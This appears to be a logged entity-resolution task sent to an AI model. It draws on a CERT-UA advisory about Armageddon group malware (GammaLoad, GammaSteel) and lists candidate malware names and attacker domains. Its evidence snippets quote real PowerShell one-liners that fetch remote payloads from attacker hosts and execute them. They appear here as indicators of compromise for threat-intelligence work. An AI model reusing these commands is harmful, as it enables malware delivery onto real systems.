=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. LOADJUMP [aka LoadEdge, GammaLoad, GammaLoad.PS1]
E2. GammaLoad.PS1_v2
E3. stage1.ps1
E4. TRYxaEbX_2.ps1
E5. stage2.ps1
E6. HTA file
E7. TRYxaEbX [aka TRYxaEbX.ps1]
E8. z.ps1
E9. watchOS
E10. OUTSTEEL
E11. ConfuserEx
E12. .NET Framework
E13. python-requests
E14. GraphSteel
E15. Ngrok
E16. WhisperGate [aka WhisperPack, WhisperKill]
E17. MarsStealer
E18. HTM dropper
E19. FTPGetter
E20. JesterStealer
E21. Cisco IOS [aka Cisco IOS XE]
E22. Hashcat
E23. needrestart
E24. Meterpreter
E25. tvOS
E26. PowerShell [aka powershell.exe]
E27. b.exe
E28. 223329.exe
E29. POWERGAP
E30. Icloud.exe [aka Iclouding.exe]
E31. 62ea.exe
E32. SPECTR.Shell
E33. wscript.exe
E34. 966449.exe
E35. GammaSteel.NET
E36. HarvesterX
E37. PowerShell (powershell.exe)
E38. GammaSteel.PS1
E39. kopratiso.ru
E40. acteran.ru
E41. bilitora.ru
E42. fishitor.ru
E43. apoxipodes.ru
E44. dodortar.ru
E45. tiloraso.ru
E46. a0322810.xsph.ru
E47. billyhot.ru
E48. nikotod.ru
E49. candidar.ru
E50. lnk-upload.dodortar.ru
E51. dod-upload.dodortar.ru
E52. motocheck.in
E53. milotraf.ru
E54. stormpredictor.host
E55. meteolink.host
E56. successilin.top
E57. xsph.ru
E58. erwini.ru
E59. mulleti.ru
E60. bul-opros.top
E61. iol.pt
E62. toknowall.com
E63. gopoppers.com
E64. podologaneri.it
E65. nitikora.ru
E66. districoperav.icu
E67. potrakit.ru
E68. giraffe-tour.ru
E69. rivierafamily.com
E70. mx-out-14.default-host.net
E71. tridiuma.ru
E72. yandex.ru
E73. varanasiclick.ru
E74. qiwardos.ru
E75. olei.ro
E76. jevejosader.top
E77. enlamentedeunasesor.com
E78. milotrad.ru
E79. s8.h.mchost.ru
E80. aspe.ro
E81. omyce.ru
E82. tortunas.ru
E83. pastebin.com
E84. leonardis.ru
E85. jokotras.ru
E86. afi-opros.top
E87. mitraseo.hol.es
E88. parodadoca.ru
E89. marmaris.com.ua
E90. nx0.ru
E91. ncscc.gov.ua
E92. www.msftncsi.com
E93. tas-gos.top
E94. staystrongjewels.com
E95. wi-opros.top
E96. xcasinobonuses.net
E97. viewdns.net
E98. servebeer.com
E99. evil.server.com
E100. 3utilities.com
E101. gotdns.ch
E102. agreminj.com
E103. virustotal.com
E104. airmauritiusticket.com
E105. whoer.net
E106. sytes.net
E107. bounceme.net
E108. ddns.net
E109. plexbd.net
E110. brunoboys.net
E111. netbin.host
E112. dcshost.net
E113. d-upl.ddns.net
E114. freedynamicdns.net
E115. gov-ua.info
E116. cloudflare-dns.com
E117. ns.ns2-dns.com
E118. president.gov.ua.administration.vakansiyi.administration.president.gov-ua.info
E119. dyndns.com
E120. ns.ns3-dns.com
E121. arentuk.com
E122. www.facebook.com
E123. winchconstruction.com
E124. www.michiganmastereltiempo.com
E125. www.symantec.com
E126. kohhd.com
E127. fluoxi.com
E128. atlantar.ru
E129. motoristo.ru
E130. moolin.ru
E131. bubenci.ru
E132. callsol.ru
E133. clipperso.ru
E134. cooperi.ru
E135. detroito.ru
E136. farafauler.ru
E137. flayga.ru
E138. ganara.ru
E139. hawksi.ru
E140. hofsteder.ru
E141. kilitro.ru
E142. kurapat.ru
E143. lnasfe.ru
E144. lopasts.ru
E145. mafirti.ru
E146. metanat.ru
E147. mitlubald.ru
E148. paparat.ru
E149. pasamart.ru
E150. qkcew.ru
E151. rncsq.ru
E152. tarlit.ru
E153. tbwelo.ru
E154. wicksl.ru
E155. xcqef.ru
E156. nxkad.ru
E157. dnslookup.seowebchecker.com
E158. tools.nexcess.net
E159. viewdns.info
E160. www.portcheckers.com
E161. lover.printing82.detroito.ru
Mentions:
M1. "GammaSteel.PS1" (Software) — options: E1, E2, E3, E4 — ctx: S1
